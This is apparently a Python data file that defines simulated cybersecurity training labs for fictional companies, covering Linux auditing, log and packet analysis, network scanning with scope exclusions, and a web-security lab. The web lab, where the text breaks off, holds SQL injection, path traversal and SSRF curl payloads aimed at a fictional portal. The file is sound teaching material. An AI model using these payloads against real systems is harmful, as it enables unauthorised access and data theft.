from lib import Q, TF

LABS = []

COMMON_RULES = ["This is a simulation. No command runs on your device or touches any real network.",
                "All hosts, users and data are fictional (Silverline Ltd, Northwind Health, lab.local).",
                "In real life, perform these actions only on systems you own or are explicitly authorised to test."]


def C(match, output, task=None):
    return {"match": match, "output": output.strip("\n"), "task": task}


def T(id, text, hint):
    return {"id": id, "text": text, "hint": hint}


def S(text, question, options, answer, explain, artifact=""):
    return {"text": text, "artifact": artifact.strip("\n"), "question": question, "options": options, "answer": answer, "explain": explain}


def LAB(id, title, category, level, module, kind, minutes, scenario, background, objectives, environment, tools, tasks, reflection,
        solution, defensive, badge, questions, prompt="", commands=None, steps=None, rules=None):
    LABS.append({"id": id, "title": title, "category": category, "level": level, "module": module, "type": kind, "minutes": minutes,
                 "scenario": scenario, "background": background, "objectives": objectives, "rules": (rules or []) + COMMON_RULES,
                 "environment": environment, "tools": tools, "prompt": prompt, "tasks": tasks, "commands": commands or [],
                 "steps": steps or [], "reflection": reflection, "solution": solution, "defensive": defensive, "badge": badge,
                 "questions": questions})


# ---------------- TERMINAL LABS ----------------
LAB("lab_linux_nav", "Linux Navigation Basics", "Linux", 1, "m03", "terminal", 20,
    "You have just joined Silverline Ltd's IT team. Your mentor gives you a training VM and asks you to find your way around and locate the onboarding notes.",
    "Silverline's training server 'trainvm' runs Ubuntu. Your account is 'learner'.",
    ["Find your current directory and user", "List files including hidden ones", "Navigate to the onboarding folder and read the note", "Find all .conf files in /etc/app"],
    "Simulated Ubuntu 22.04 VM 'trainvm' (offline)", ["pwd", "whoami", "ls", "cd", "cat", "find"],
    [T("t1", "Show your current directory", "Use the command that prints the working directory."),
     T("t2", "Show which user you are", "whoami"),
     T("t3", "List ALL files in your home directory, including hidden ones, in long format", "ls with -l and -a"),
     T("t4", "Read the file onboarding/welcome.txt", "cat followed by the relative path"),
     T("t5", "Find every file ending in .conf under /etc/app", "find /etc/app -name \"*.conf\"")],
    ["Why are some files hidden?", "What is the difference between an absolute and relative path?", "Which command would you use to search inside the .conf files?"],
    "pwd -> /home/learner; whoami -> learner; ls -la shows .bashrc, .ssh and onboarding/; cat onboarding/welcome.txt reveals the note; find /etc/app -name \"*.conf\" lists app.conf and db.conf.",
    "Defenders review hidden files and directories like .ssh because attackers hide persistence there (e.g. unauthorised SSH keys). Least privilege means 'learner' cannot read root-only files.",
    "Terminal Explorer",
    [Q("Which command shows hidden files?", ["ls", "ls -a", "cd -h", "cat -a"], 1, "-a shows entries starting with a dot."),
     Q("Where did you find app configuration files?", ["/home", "/etc/app", "/var/log", "/tmp"], 1, "/etc holds configuration.")],
    prompt="learner@trainvm:~$",
    commands=[
      C(r"^pwd$", "/home/learner", "t1"),
      C(r"^whoami$", "learner", "t2"),
      C(r"^id$", "uid=1001(learner) gid=1001(learner) groups=1001(learner),27(sudo-training)"),
      C(r"^ls$", "Desktop  Documents  onboarding  scripts"),
      C(r"^ls\s+(-la|-al|-l\s+-a|-a\s+-l)$", """total 40
drwxr-x--- 7 learner learner 4096 Mar  2 09:10 .
drwxr-xr-x 4 root    root    4096 Feb 27 16:02 ..
-rw------- 1 learner learner  220 Feb 27 16:02 .bash_history
-rw-r--r-- 1 learner learner 3771 Feb 27 16:02 .bashrc
drwx------ 2 learner learner 4096 Mar  1 11:20 .ssh
drwxr-xr-x 2 learner learner 4096 Mar  1 11:00 Desktop
drwxr-xr-x 2 learner learner 4096 Mar  1 11:00 Documents
drwxr-xr-x 2 learner learner 4096 Mar  2 09:10 onboarding
drwxr-xr-x 2 learner learner 4096 Mar  2 09:12 scripts""", "t3"),
      C(r"^ls\s+-a$", ".  ..  .bash_history  .bashrc  .ssh  Desktop  Documents  onboarding  scripts"),
      C(r"^ls\s+-l$", "drwxr-xr-x 2 learner learner 4096 Mar  1 11:00 Desktop\ndrwxr-xr-x 2 learner learner 4096 Mar  1 11:00 Documents\ndrwxr-xr-x 2 learner learner 4096 Mar  2 09:10 onboarding\ndrwxr-xr-x 2 learner learner 4096 Mar  2 09:12 scripts\n(hint: hidden files need -a)"),
      C(r"^ls\s+onboarding/?$", "welcome.txt  rules.txt"),
      C(r"^cd\s+onboarding/?$", "(changed directory to /home/learner/onboarding - in this simulation, keep using paths from your home directory)"),
      C(r"^cat\s+(\./)?onboarding/welcome\.txt$", """Welcome to Silverline Ltd IT!
- Your lab VMs are on the isolated 10.10.10.0/24 network.
- Never test anything outside the lab without written authorisation.
- Ask your mentor (Priya) before installing tools.
- Report suspicious activity to soc@silverline.test""", "t4"),
      C(r"^cat\s+(\./)?onboarding/rules\.txt$", "1. Snapshot before experiments\n2. Lab network only\n3. Keep notes\n4. Clean up after yourself"),
      C(r"^cat\s+welcome\.txt$", "cat: welcome.txt: No such file or directory  (tip: it is inside the onboarding folder)"),
      C(r"^cat\s+/etc/shadow$", "cat: /etc/shadow: Permission denied  (good - only root can read password hashes)"),
      C(r"^find\s+/etc/app\s+-name\s+[\"']?\*\.conf[\"']?$", "/etc/app/app.conf\n/etc/app/db.conf", "t5"),
      C(r"^ls\s+/etc/app/?$", "app.conf  db.conf  README"),
      C(r"^cat\s+/etc/app/app\.conf$", "listen_port=8080\nlog_level=info\ndebug=false"),
      C(r"^cat\s+/etc/app/db\.conf$", "cat: /etc/app/db.conf: Permission denied"),
    ])

LAB("lab_linux_perms", "Linux Permissions Audit", "Linux", 2, "m03", "terminal", 30,
    "Silverline's web server 'web01' failed an internal review. You are asked to audit file permissions and sudo rules and recommend fixes.",
    "You have a read-only audit account with limited sudo rights granted for this review.",
    ["Find SUID binaries and identify the unexpected one", "Find world-writable files", "Review sudo rules", "Fix the risky backup script permissions"],
    "Simulated Ubuntu server web01 (fictional)", ["find", "ls -l", "sudo -l", "chmod", "cat"],
    [T("t1", "List SUID files on the system", "find / -perm -4000 -type f 2>/dev/null"),
     T("t2", "Find world-writable files", "find / -perm -o+w -type f 2>/dev/null"),
     T("t3", "Check your sudo rules", "sudo -l"),
     T("t4", "Inspect the backup script's permissions", "ls -l /opt/backup/backup.sh"),
     T("t5", "Fix the backup script so only root can write and run it", "chmod 700 /opt/backup/backup.sh")],
    ["Why is a world-writable script run by root via cron critical?", "Which SUID binaries are normal on Ubuntu?", "How would you prevent this regressing?"],
    "SUID list contains /usr/local/bin/sysinfo (unexpected, owned by root). World-writable: /opt/backup/backup.sh (run by root cron). Fix: chmod 700 and chown root:root; remove SUID from sysinfo after confirming with owners.",
    "Detect with scheduled permission audits (find), file integrity monitoring on scripts executed by root, and configuration management enforcing modes. Restrict cron scripts to root-owned, non-writable paths.",
    "Permission Auditor",
    [Q("Which finding is most severe?", ["/usr/bin/passwd is SUID", "World-writable script executed by root cron", "User has a .bashrc", "/tmp has sticky bit"], 1, "Any user could inject commands that run as root."),
     Q("What does chmod 700 set?", ["rwx for owner only", "rwx for everyone", "read-only for all", "SUID"], 0, "Owner rwx, group and others none.")],
    prompt="auditor@web01:~$",
    commands=[
      C(r"^find\s+/\s+-perm\s+-4000\s+-type\s+f(\s+2>/dev/null)?$", """/usr/bin/passwd
/usr/bin/sudo
/usr/bin/su
/usr/bin/mount
/usr/bin/umount
/usr/bin/chsh
/usr/bin/newgrp
/usr/local/bin/sysinfo""", "t1"),
      C(r"^ls\s+-l\s+/usr/local/bin/sysinfo$", "-rwsr-xr-x 1 root root 16912 Jan 14  2025 /usr/local/bin/sysinfo   <- custom SUID root binary (not part of Ubuntu)"),
      C(r"^find\s+/\s+-perm\s+(-o\+w|-0002|-002)\s+-type\s+f(\s+2>/dev/null)?$", "/opt/backup/backup.sh\n/var/www/html/uploads/.keep", "t2"),
      C(r"^sudo\s+-l$", """Matching Defaults entries for auditor on web01:
    env_reset, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin
User auditor may run the following commands on web01:
    (root) NOPASSWD: /usr/bin/find, /bin/chmod /opt/backup/backup.sh, /bin/ls
Note: 'deploy' user (from /etc/sudoers.d/deploy): (ALL) NOPASSWD: /usr/bin/vim   <- editors as root allow shell escapes""", "t3"),
      C(r"^ls\s+-l\s+/opt/backup/backup\.sh$", "-rwxrwxrwx 1 root root 412 Feb 11 02:00 /opt/backup/backup.sh   <- world-writable!", "t4"),
      C(r"^cat\s+/etc/crontab$", "# m h dom mon dow user command\n0 2 * * * root /opt/backup/backup.sh\n17 * * * * root cd / && run-parts --report /etc/cron.hourly"),
      C(r"^cat\s+/opt/backup/backup\.sh$", "#!/bin/bash\ntar czf /backups/www-$(date +%F).tgz /var/www/html\n# TODO: rotate old backups"),
      C(r"^(sudo\s+)?chmod\s+(700|0700|u=rwx,go=)\s+/opt/backup/backup\.sh$", "Permissions updated.\n-rwx------ 1 root root 412 Feb 11 02:00 /opt/backup/backup.sh", "t5"),
      C(r"^(sudo\s+)?chmod\s+(755|0755)\s+/opt/backup/backup\.sh$", "Permissions updated to rwxr-xr-x. Better - not writable by others. (700 is tighter since only root needs it.)", "t5"),
      C(r"^(sudo\s+)?chmod\s+777\s+.*$", "Refused in this simulation: 777 makes files writable by everyone - the opposite of the fix."),
    ])

LAB("lab_linux_logs", "Linux Log Analysis: SSH Brute Force", "Incident response", 2, "m03", "terminal", 25,
    "Silverline's SOC received an alert for many failed SSH logins on 'bastion01'. Investigate the auth log.",
    "auth.log contains 24 hours of authentication events. You have read access.",
    ["Count failed SSH logins", "Identify the top source IP", "Check whether any login succeeded from that IP", "Recommend controls"],
    "Simulated bastion01 /var/log/auth.log", ["grep", "wc", "awk", "sort", "uniq"],
    [T("t1", "Count lines containing 'Failed password'", "grep 'Failed password' /var/log/auth.log | wc -l"),
     T("t2", "Find the top source IPs of failed logins", "grep 'Failed password' /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -nr"),
     T("t3", "Check for successful logins (Accepted)", "grep 'Accepted' /var/log/auth.log")],
    ["Did the attacker succeed?", "What makes key-only SSH stronger?", "What would you add to detection?"],
    "1,847 failures; 203.0.113.77 caused 1,790; no 'Accepted' from that IP - the only accepted login is priya from the VPN range 10.8.0.14 using a public key.",
    "Disable password authentication, use fail2ban/rate limiting, restrict SSH to the VPN, alert on bursts of failures and on any success after failures.",
    "Log Detective",
    [Q("Which IP was the main attacker?", ["10.8.0.14", "203.0.113.77", "198.51.100.5", "127.0.0.1"], 1, "It generated 1,790 failures."),
     Q("Best control to stop SSH password guessing?", ["Longer banner", "Key-only authentication", "Changing the hostname", "More logs"], 1, "Without passwords there is nothing to guess.")],
    prompt="analyst@bastion01:~$",
    commands=[
      C(r"^grep\s+['\"]?Failed password['\"]?\s+/var/log/auth\.log\s*\|\s*wc\s+-l$", "1847", "t1"),
      C(r"^grep\s+['\"]?Failed password['\"]?\s+/var/log/auth\.log$", """Mar  4 01:12:03 bastion01 sshd[2211]: Failed password for root from 203.0.113.77 port 51122 ssh2
Mar  4 01:12:05 bastion01 sshd[2213]: Failed password for invalid user admin from 203.0.113.77 port 51130 ssh2
Mar  4 01:12:06 bastion01 sshd[2215]: Failed password for invalid user test from 203.0.113.77 port 51136 ssh2
... (1,847 lines - tip: pipe to wc -l or awk/sort/uniq)"""),
      C(r"^grep\s+['\"]?Failed password['\"]?\s+/var/log/auth\.log\s*\|\s*awk\s+['\"]\{print \$\d+\}['\"]\s*\|\s*sort\s*\|\s*uniq\s+-c(\s*\|\s*sort\s+-nr?)?$", """   1790 203.0.113.77
     41 198.51.100.5
     16 10.8.0.22""", "t2"),
      C(r"^grep\s+['\"]?Accepted['\"]?\s+/var/log/auth\.log$", "Mar  4 08:31:44 bastion01 sshd[4410]: Accepted publickey for priya from 10.8.0.14 port 50221 ssh2: ED25519 SHA256:k3...", "t3"),
      C(r"^tail\s+(-n\s*\d+\s+)?/var/log/auth\.log$", "Mar  4 09:02:10 bastion01 sshd[4521]: Failed password for invalid user oracle from 198.51.100.5 port 40112 ssh2\nMar  4 09:02:11 bastion01 sshd[4521]: Connection closed by 198.51.100.5 port 40112 [preauth]"),
      C(r"^grep\s+-i\s+['\"]?passwordauthentication['\"]?\s+/etc/ssh/sshd_config$", "PasswordAuthentication yes   <- finding: passwords allowed"),
    ])

LAB("lab_win_ps", "Windows PowerShell Security Audit", "Windows", 2, "m03", "terminal", 30,
    "Silverline's finance workstation FIN-WS07 is being reviewed after an awareness incident. Use PowerShell to audit it.",
    "Simulated Windows 11 workstation. You are a local administrator for this review.",
    ["List local administrators", "Check the firewall profiles", "Check Defender status", "Review failed logons", "Find suspicious services"],
    "Simulated PowerShell 7 session on FIN-WS07", ["Get-LocalGroupMember", "Get-NetFirewallProfile", "Get-MpComputerStatus", "Get-WinEvent", "Get-Service"],
    [T("t1", "List members of the local Administrators group", "Get-LocalGroupMember -Group Administrators"),
     T("t2", "Check whether firewall profiles are enabled", "Get-NetFirewallProfile | Select Name, Enabled"),
     T("t3", "Check Microsoft Defender status", "Get-MpComputerStatus"),
     T("t4", "Retrieve recent failed logon events (4625)", "Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625} -MaxEvents 10"),
     T("t5", "List running services", "Get-Service | Where-Object Status -eq Running")],
    ["Which finding has the highest risk?", "Why should daily users not be local admins?", "Which event IDs would you alert on?"],
    "Admins include 'jsmith' (daily user) - excessive privilege. Public firewall profile disabled. Defender real-time protection ON but signatures 21 days old. 4625 burst from 'svc_scan'. Unusual service 'UpdaterSvc' runs from C:\\Users\\Public\\upd.exe.",
    "Remove daily users from Administrators (use LAPS for local admin), enforce firewall via GPO, ensure Defender updates, alert on 4625 bursts and 7045 new services, investigate binaries running from user-writable paths.",
    "Windows Auditor",
    [Q("Which service is suspicious?", ["Spooler", "WinDefend", "UpdaterSvc running from C:\\Users\\Public", "Dnscache"], 2, "Services from user-writable folders are a red flag."),
     Q("Which event ID records a new service install?", ["4625", "7045", "4624", "4720"], 1, "System log 7045.")],
    prompt="PS C:\\Users\\auditor>",
    commands=[
      C(r"(?i)^get-localgroupmember\s+(-group\s+)?['\"]?administrators['\"]?$", """ObjectClass Name                    PrincipalSource
----------- ----                    ---------------
User        FIN-WS07\\Administrator  Local          (disabled)
User        FIN-WS07\\auditor        Local
User        SILVERLINE\\jsmith       ActiveDirectory   <- daily user with admin rights
Group       SILVERLINE\\Domain Admins ActiveDirectory""", "t1"),
      C(r"(?i)^get-netfirewallprofile(\s*\|\s*select(-object)?\s+name\s*,\s*enabled)?$", "Name    Enabled\n----    -------\nDomain     True\nPrivate    True\nPublic    False   <- disabled", "t2"),
      C(r"(?i)^get-mpcomputerstatus.*$", "AMServiceEnabled          : True\nAntivirusEnabled          : True\nRealTimeProtectionEnabled : True\nAntivirusSignatureAge     : 21   <- signatures 21 days old\nTamperProtectionSource    : Signatures", "t3"),
      C(r"(?i)^get-winevent\s+-filterhashtable\s+@\{.*4625.*\}.*$", """TimeCreated          Id  Message
-----------          --  -------
04/03/2026 02:14:07 4625 An account failed to log on. Account: svc_scan  Source: 10.10.20.31  Logon Type: 3
04/03/2026 02:14:07 4625 An account failed to log on. Account: svc_scan  Source: 10.10.20.31  Logon Type: 3
04/03/2026 02:14:06 4625 An account failed to log on. Account: administrator Source: 10.10.20.31 Logon Type: 3
... 212 events in 3 minutes from 10.10.20.31""", "t4"),
      C(r"(?i)^get-service\s*\|\s*where(-object)?\s+(\{\s*\$_\.)?status\s+-eq\s+['\"]?running['\"]?\s*\}?$", """Status  Name          DisplayName
------  ----          -----------
Running Dnscache      DNS Client
Running EventLog      Windows Event Log
Running mpssvc        Windows Defender Firewall
Running Spooler       Print Spooler
Running UpdaterSvc    Updater Service       <- not a Microsoft service
Running WinDefend     Microsoft Defender Antivirus Service""", "t5"),
      C(r"(?i)^get-ciminstance\s+win32_service.*updatersvc.*$", "Name: UpdaterSvc  PathName: C:\\Users\\Public\\upd.exe  StartName: LocalSystem   <- SYSTEM service from a user-writable folder"),
      C(r"(?i)^get-hotfix$", "HotFixID   InstalledOn\nKB5034441  14/01/2026\nKB5034123  09/01/2026\n(latest monthly update missing)"),
      C(r"(?i)^get-localuser$", "Name           Enabled\nAdministrator  False\nauditor        True\nGuest          False\nsupport        True   <- unknown local account"),
    ])

LAB("lab_net_basics", "Network Basics: Addressing and DNS", "Networking", 1, "m02", "terminal", 20,
    "A new Silverline lab VM cannot reach the intranet. Investigate its network configuration.",
    "The VM is on the isolated lab network 10.10.10.0/24.",
    ["Read IP configuration", "Check the routing table", "Test the gateway", "Test DNS resolution and spot the problem"],
    "Simulated Linux VM lab-07", ["ip addr", "ip route", "ping", "cat /etc/resolv.conf", "nslookup"],
    [T("t1", "Show the VM's IP addresses", "ip addr"),
     T("t2", "Show the routing table", "ip route"),
     T("t3", "Ping the default gateway", "ping -c 4 10.10.10.1"),
     T("t4", "Check the DNS resolver configuration", "cat /etc/resolv.conf"),
     T("t5", "Resolve intranet.lab.local using the correct DNS server 10.10.10.53", "nslookup intranet.lab.local 10.10.10.53")],
    ["Which layer was the problem at?", "How would DHCP normally deliver the DNS server?", "What other tool shows the path to a host?"],
    "IP 10.10.10.57/24, gateway 10.10.10.1 reachable, but resolv.conf points to 10.10.99.53 (wrong). Using 10.10.10.53 resolves intranet.lab.local to 10.10.10.80.",
    "Wrong DNS settings can also be malicious (rogue DHCP). Use DHCP snooping, monitor for unexpected DNS servers and lock resolver settings via configuration management.",
    "Network Navigator",
    [Q("What was misconfigured?", ["IP address", "Default gateway", "DNS server", "MAC address"], 2, "resolv.conf pointed to an unreachable DNS server."),
     Q("Which command shows the routing table?", ["ip addr", "ip route", "nslookup", "ss"], 1, "ip route.")],
    prompt="learner@lab-07:~$",
    commands=[
      C(r"^ip\s+(a|addr|address)(\s+show)?$", """1: lo: <LOOPBACK,UP> mtu 65536
    inet 127.0.0.1/8 scope host lo
2: eth0: <BROADCAST,MULTICAST,UP> mtu 1500
    link/ether 08:00:27:4e:66:a1 brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.57/24 brd 10.10.10.255 scope global dynamic eth0
    inet6 fe80::a00:27ff:fe4e:66a1/64 scope link""", "t1"),
      C(r"^ip\s+(r|route)(\s+show)?$", "default via 10.10.10.1 dev eth0\n10.10.10.0/24 dev eth0 proto kernel scope link src 10.10.10.57", "t2"),
      C(r"^ping\s+(-c\s*\d+\s+)?10\.10\.10\.1$", "PING 10.10.10.1 56(84) bytes of data.\n64 bytes from 10.10.10.1: icmp_seq=1 ttl=64 time=0.42 ms\n64 bytes from 10.10.10.1: icmp_seq=2 ttl=64 time=0.39 ms\n--- 10.10.10.1 ping statistics ---\n4 packets transmitted, 4 received, 0% packet loss", "t3"),
      C(r"^cat\s+/etc/resolv\.conf$", "nameserver 10.10.99.53   <- not on this network and not reachable\nsearch lab.local", "t4"),
      C(r"^nslookup\s+intranet\.lab\.local$", ";; connection timed out; no servers could be reached"),
      C(r"^nslookup\s+intranet\.lab\.local\s+10\.10\.10\.53$", "Server:  10.10.10.53\nAddress: 10.10.10.53#53\n\nName:    intranet.lab.local\nAddress: 10.10.10.80", "t5"),
      C(r"^ping\s+.*(8\.8\.8\.8|google|\.com).*$", "Blocked: this lab network is isolated from the internet by design."),
      C(r"^traceroute\s+10\.10\.10\.80$", "1  10.10.10.80  0.51 ms (same subnet - direct)"),
    ])

LAB("lab_scan_sim", "Scanning Simulator: Map the Lab Network", "Scanning", 3, "m07", "terminal", 40,
    "Silverline authorised an internal assessment of the lab range 10.10.10.0/24 only. Host 10.10.10.200 (a fragile medical-device gateway) is EXCLUDED.",
    "Rules of engagement: business hours, no DoS, exclude 10.10.10.200, save all output.",
    ["Discover live hosts while respecting the exclusion", "Scan ports and versions on the web server", "Identify unexpected exposed services", "Validate one banner with Netcat"],
    "Simulated lab network 10.10.10.0/24 (fictional)", ["nmap", "nc"],
    [T("t1", "Discover live hosts with a ping scan, excluding 10.10.10.200", "nmap -sn 10.10.10.0/24 --exclude 10.10.10.200"),
     T("t2", "Run a service version scan of 10.10.10.15", "nmap -sV 10.10.10.15"),
     T("t3", "Run default safe scripts and versions on 10.10.10.20 and save output", "nmap -sC -sV -oA db01 10.10.10.20"),
     T("t4", "Grab the FTP banner on 10.10.10.15 with Netcat", "nc -nv 10.10.10.15 21"),
     T("t5", "Scan all TCP ports on 10.10.10.30", "nmap -p- 10.10.10.30")],
    ["Which services should not be exposed and why?", "What would happen if you had scanned the excluded host?", "How would you validate the MySQL exposure?"],
    "Live: .1 gateway, .15 web01 (21 vsftpd anonymous, 22, 80), .20 db01 (3306 MySQL on all interfaces), .30 dev01 (8080 Jenkins exposed without auth), .53 DNS. Findings: anonymous FTP, MySQL exposed to the lab LAN, unauthenticated Jenkins.",
    "Defenders detect scans via IDS signatures and firewall logs (many SYNs/ports). Reduce exposure: bind databases to localhost or app subnets, disable anonymous FTP, require authentication on CI tools, segment management services.",
    "Scan Specialist",
    [Q("Which service is the most serious exposure?", ["DNS on .53", "Unauthenticated Jenkins on 8080", "SSH on 22", "Gateway ICMP"], 1, "Unauthenticated CI servers can often execute code."),
     Q("How did you respect the exclusion?", ["Ignored it", "--exclude 10.10.10.200", "Scanned it slowly", "Used -Pn"], 1, "Exclusions are part of scope.")],
    prompt="tester@kali-lab:~$",
    commands=[
      C(r"^nmap\s+-sn\s+10\.10\.10\.0/24\s+--exclude\s+10\.10\.10\.200$", """Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for gw.lab.local (10.10.10.1)
Host is up (0.00041s latency).
Nmap scan report for web01.lab.local (10.10.10.15)
Host is up (0.00052s latency).
Nmap scan report for db01.lab.local (10.10.10.20)
Host is up (0.00049s latency).
Nmap scan report for dev01.lab.local (10.10.10.30)
Host is up (0.00061s latency).
Nmap scan report for dns.lab.local (10.10.10.53)
Host is up (0.00044s latency).
Nmap done: 255 IP addresses (5 hosts up) scanned in 2.31 seconds""", "t1"),
      C(r"^nmap\s+-sn\s+10\.10\.10\.0/24$", "STOP - scope violation: 10.10.10.200 is excluded in the rules of engagement. Use --exclude 10.10.10.200. (Capstone scoring penalises scope breaches.)"),
      C(r"^nmap\s+.*10\.10\.10\.200.*$", "STOP - 10.10.10.200 is out of scope (fragile medical-device gateway). Command blocked by the simulator."),
      C(r"^nmap\s+-sV\s+10\.10\.10\.15$", """PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
Service Info: OSs: Unix, Linux""", "t2"),
      C(r"^nmap\s+-sC\s+-sV\s+(-oA\s+\S+\s+)?10\.10\.10\.20(\s+-oA\s+\S+)?$", """PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1
3306/tcp open  mysql   MySQL 8.0.36
| mysql-info:
|   Protocol: 10
|   Version: 8.0.36
|_  Auth Plugin Name: caching_sha2_password
Output saved: db01.nmap, db01.xml, db01.gnmap
Note: MySQL listening on the LAN interface - should it be restricted to the app server?""", "t3"),
      C(r"^nmap\s+-sC\s+-sV\s+10\.10\.10\.15$", """21/tcp open  ftp  vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-r--r--r--  1 0 0  1180 Feb 20 public_notice.txt
22/tcp open  ssh  OpenSSH 8.9p1
80/tcp open  http Apache httpd 2.4.52
|_http-title: Silverline Intranet (Staging)"""),
      C(r"^(nc|netcat)\s+-nv\s+10\.10\.10\.15\s+21$", "(UNKNOWN) [10.10.10.15] 21 (ftp) open\n220 (vsFTPd 3.0.5) Silverline staging FTP", "t4"),
      C(r"^nmap\s+-p-\s+10\.10\.10\.30$", """PORT     STATE    SERVICE
22/tcp   open     ssh
8080/tcp open     http-proxy
9000/tcp filtered cslistener
Visiting http://10.10.10.30:8080 in the lab shows: Jenkins 2.440 - 'Manage Jenkins' accessible without login  <- critical misconfiguration""", "t5"),
      C(r"^nmap\s+10\.10\.10\.(15|20|30|53|1)$", "Default top-1000 scan complete. Try -sV for versions or -p- for all ports."),
      C(r"^nmap\s+-sU\s+.*$", "UDP scan (simulated): 53/udp open domain on 10.10.10.53; others open|filtered - UDP results are often ambiguous."),
      C(r"^nmap\s+.*(8\.8\.8\.8|google|\.com|scanme).*$", "Blocked: only 10.10.10.0/24 is in scope for this lab."),
    ])

LAB("lab_pcap", "PCAP Analysis: Cleartext Credentials and a Scan", "Networking", 3, "m02", "terminal", 35,
    "The Northwind Health network team supplied an authorised capture 'clinic.pcap' from a lab replica. Identify insecure protocols and suspicious activity.",
    "tshark (command-line Wireshark) is available for the supplied file only. Credentials in this capture are fictional training values.",
    ["Summarise conversations", "Find cleartext protocol use", "Identify the scanning host", "Recommend fixes"],
    "Simulated tshark against supplied clinic.pcap", ["tshark"],
    [T("t1", "Show IP conversations statistics", "tshark -r clinic.pcap -q -z conv,ip"),
     T("t2", "Filter for FTP traffic", "tshark -r clinic.pcap -Y ftp"),
     T("t3", "Filter SYN packets without ACK to find scanning", "tshark -r clinic.pcap -Y \"tcp.flags.syn==1 && tcp.flags.ack==0\""),
     T("t4", "Look at DNS queries", "tshark -r clinic.pcap -Y dns")],
    ["Why is FTP a risk on a clinical network?", "How did you identify the scanner?", "What does the odd DNS name suggest?"],
    "FTP between 10.20.0.45 (imaging PC) and 10.20.0.10 shows USER radiology / PASS (training value). 10.20.0.99 sent 1,000+ SYNs to many ports on 10.20.0.10 = scan. DNS query for a random-looking long subdomain may indicate tunnelling or malware beaconing.",
    "Replace FTP with SFTP/FTPS, rotate exposed credentials, investigate 10.20.0.99, add IDS rules for scans and DNS anomalies, segment imaging devices.",
    "Packet Analyst",
    [Q("Which protocol exposed credentials?", ["SSH", "FTP", "HTTPS", "DNS"], 1, "FTP sends USER/PASS in cleartext."),
     Q("What indicated scanning?", ["Large HTTPS download", "Many SYN-only packets to many ports from one host", "One DNS query", "ARP request"], 1, "Classic SYN scan pattern.")],
    prompt="analyst@soc-lab:~$",
    commands=[
      C(r"^tshark\s+-r\s+clinic\.pcap\s+-q\s+-z\s+conv,ip$", """IPv4 Conversations
                 |  <-  | |  ->  | | Total |
10.20.0.99  <-> 10.20.0.10     1013 frames  2032 frames  3045 frames
10.20.0.45  <-> 10.20.0.10      214 frames   230 frames   444 frames
10.20.0.31  <-> 10.20.0.53       12 frames    12 frames    24 frames""", "t1"),
      C(r"^tshark\s+-r\s+clinic\.pcap\s+-Y\s+['\"]?ftp['\"]?$", """ 41 3.201 10.20.0.10 -> 10.20.0.45 FTP 220 Welcome to PACS-Archive FTP
 43 3.212 10.20.0.45 -> 10.20.0.10 FTP Request: USER radiology
 45 3.230 10.20.0.45 -> 10.20.0.10 FTP Request: PASS Tr4ining-Only-01
 47 3.241 10.20.0.10 -> 10.20.0.45 FTP 230 Login successful.""", "t2"),
      C(r"^tshark\s+-r\s+clinic\.pcap\s+-Y\s+['\"]tcp\.flags\.syn\s*==\s*1\s*&&\s*tcp\.flags\.ack\s*==\s*0['\"]$", """ 102 10.10 10.20.0.99 -> 10.20.0.10 TCP 51234 -> 21 [SYN]
 103 10.10 10.20.0.99 -> 10.20.0.10 TCP 51234 -> 22 [SYN]
 104 10.10 10.20.0.99 -> 10.20.0.10 TCP 51234 -> 23 [SYN]
 105 10.10 10.20.0.99 -> 10.20.0.10 TCP 51234 -> 25 [SYN]
 ... 1,000 SYN packets to 1,000 different ports in 4.2 seconds""", "t3"),
      C(r"^tshark\s+-r\s+clinic\.pcap\s+-Y\s+['\"]?dns['\"]?$", """ 300 10.20.0.31 -> 10.20.0.53 DNS Standard query A portal.northwind.test
 302 10.20.0.31 -> 10.20.0.53 DNS Standard query TXT q8x7f2kd0zl1m3n9b6v4c5.ex-data.test   <- long random subdomain""", "t4"),
      C(r"^tshark\s+-r\s+clinic\.pcap$", "(4,213 packets - use -Y display filters or -z statistics to focus)"),
      C(r"^tshark\s+-r\s+clinic\.pcap\s+-Y\s+['\"]?http['\"]?$", " 512 10.20.0.31 -> 10.20.0.80 HTTP GET /portal/login HTTP/1.1\n 515 10.20.0.80 -> 10.20.0.31 HTTP 301 Moved Permanently -> https://"),
    ])

LAB("lab_web_sec", "Web Security Lab: Silverline Portal v1 vs v2", "Web security", 3, "m09", "terminal", 45,
    "Silverline's developers built a training portal with a vulnerable v1 and a fixed v2. Using curl in the lab, confirm each vulnerability in v1 and verify the fix in v2.",
    "Target: http://portal.lab.local (simulated, fictional). Test accounts: learner/learner-pass (yours) and bob (another customer, for authorisation tests).",
    ["Demonstrate IDOR and verify the fix", "Show SQL injection behaviour vs parameterised v2", "Show stored XSS vs encoded output", "Test path traversal and SSRF safely"],
    "Simulated Silverline Portal (v1 vulnerable, v2 fixed)", ["curl"],
    [T("t1", "As learner, request your invoice 1001 from the v1 API", "curl -b session=learner http://portal.lab.local/v1/api/invoices/1001"),
     T("t2", "Request invoice 1002 (bob's) with learner's session on v1, then on v2", "curl -b session=learner http://portal.lab.local/v1/api/invoices/1002"),
     T("t3", "Send the classic tautology to the v1 login and compare with v2", "curl -d \"username=' OR '1'='1&password=x\" http://portal.lab.local/v1/login"),
     T("t4", "View the comment board on v1 and v2 to compare output encoding", "curl http://portal.lab.local/v1/comments"),
     T("t5", "Test the v1 file download for traversal", "curl \"http://portal.lab.local/v1/download?file=../../etc/hostname\""),
     T("t6", "Test the v1 URL preview feature for SSRF against localhost", "curl \"http://portal.lab.local/v1/preview?url=http://127.0.0.1:8080/admin\"")],
    ["Which fix was the same idea in several places? (server-side checks)", "How would you write the IDOR finding?", "Why does v2 return 404 rather than 403 for bob's invoice?"],
    "v1 returns bob's invoice (IDOR) - v2 returns 404. v1 login with a tautology logs in as admin - v2 says invalid. v1 renders <i>xss-test</i> as HTML - v2 shows it escaped. v1 traversal returns 'web01' hostname file - v2 rejects. v1 preview fetches the internal admin page - v2 blocks internal addresses.",
